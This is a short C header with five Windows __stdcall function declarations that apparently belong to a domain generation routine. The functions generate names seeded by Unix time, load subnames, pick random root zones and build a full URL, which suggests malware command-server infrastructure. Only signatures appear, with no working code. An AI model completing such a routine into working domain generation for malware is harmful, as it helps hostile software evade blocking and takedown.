#ifndef __POSSESSOR_DOMAINS_H_
#define __POSSESSOR_DOMAINS_H_

void __stdcall domains_load_subnames();
wchar_t* __stdcall domains_generate_name_for_time(uint32_t unixTime);
BOOL __stdcall domains_generate_names_if_needed();
wchar_t* __stdcall domains_get_full_url();
wchar_t* __stdcall domains_get_random_root_zone();


#endif // __POSSESSOR_DOMAINS_H_
